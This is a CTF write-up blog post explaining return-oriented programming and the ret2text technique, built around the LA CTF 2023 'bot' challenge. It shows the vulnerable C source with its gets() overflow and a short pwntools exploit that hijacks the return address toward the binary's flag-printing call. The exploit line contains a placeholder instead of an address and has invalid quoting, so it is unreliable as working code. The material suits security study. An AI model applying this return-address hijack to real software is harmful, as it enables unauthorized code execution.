---
layout: "single"
title: "CTF-PWN-Stack Overflow-Basic ROP - [ret2text]"
date: "2023-11-12 11:36:02 +0800"
categories:
  - "CTF and Pwn"
tags:
  - "Learning"
  - "Security"
  - "Pwn"
  - "CTF"
  - "ROP"
series: "CTF Writeup"
excerpt: "The volatile keyword is a type modifier; volatile reminds the compiler that the variable defined after it may change at any time, so the compiled program reads data directly from the variable's address every time it needs to store or read this variable. With NX protection enabled, injecting code directly onto the stack or heap is no longer possible, so ROP (Return Oriented Programming) is currently used to bypass the protection. If the gadget's address is not fixed each time, we need to find a way to dynamically obtain the corresponding address. We can find suitable gadgets and their corresponding gadget addresses. That is, upon return, the program executes the program's own code (.text segment)"
source: "CSDN"
original_url: "https://blog.csdn.net/llovewuzhengzi/article/details/134357085"
csdn_article_id: "134357085"
migrated: true
permalink: /posts/csdn-134357085/
redirect_from:
  - "/en/CTF与Pwn/csdn-134357085/"
  - "/CTF与Pwn/csdn-134357085/"
---

{% raw %}
@[TOC]
# ROP
With NX protection enabled, injecting code directly onto the stack or heap is no longer possible, so ROP (Return Oriented Programming) is currently used to bypass the protection

Requirements:
The program has an overflow, so the return address can be controlled
Suitable gadgets and their corresponding gadget addresses can be found
If the gadget's address is not fixed each time, we need to find a way to dynamically obtain the corresponding address

# ret2text
That is, upon return, the program executes the program's own code (.text segment)

# LA CTF 2023 【bot】

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void) {
  setbuf(stdout, NULL);
  char input[64];
  volatile int give_flag = 0;
  puts("hi, how can i help?");
  gets(input);
  if (strcmp(input, "give me the flag") == 0) {
    puts("lol no");
  } else if (strcmp(input, "please give me the flag") == 0) {
    puts("no");
  } else if (strcmp(input, "help, i have no idea how to solve this") == 0) {
    puts("L");
  } else if (strcmp(input, "may i have the flag?") == 0) {
    puts("not with that attitude");
  } else if (strcmp(input, "please please please give me the flag") == 0) { //成立
    puts("i'll consider it");    
    sleep(15);
    if (give_flag) {  //溢出修改give_flag的值
      puts("ok here's your flag");
      system("cat flag.txt");
    } else {
      puts("no");
    }
  } else {
    puts("sorry, i didn't understand your question");
    exit(1);
  }
}
```

The volatile keyword is a type modifier; volatile reminds the compiler that the variable defined after it may change at any time, so the compiled program reads data directly from the variable's address every time it needs to store or read this variable.

Local variables are pushed onto the stack from top to bottom: defined first, pushed first

The gets overflow cannot reach give_flag

> set var $pc=0x555555555160 modifies the value of a register
> set {int}0x83040 = 4 modifies the contents of some memory

exp

```python
from pwn import*
context(os="linux",arch="amd64",log_level="debug")

f=process("./llk")
gdb.attach(f,"b main")
s=ELF("./llk")

payload=b"please please please give me the flag\x00".ljust(64+8,b"a")+b"system("cat flag.txt")的地址"
f.sendlineafter(b"hi, how can i help?\n",payload)
f.recv()
f.interactive()

```
{% endraw %}
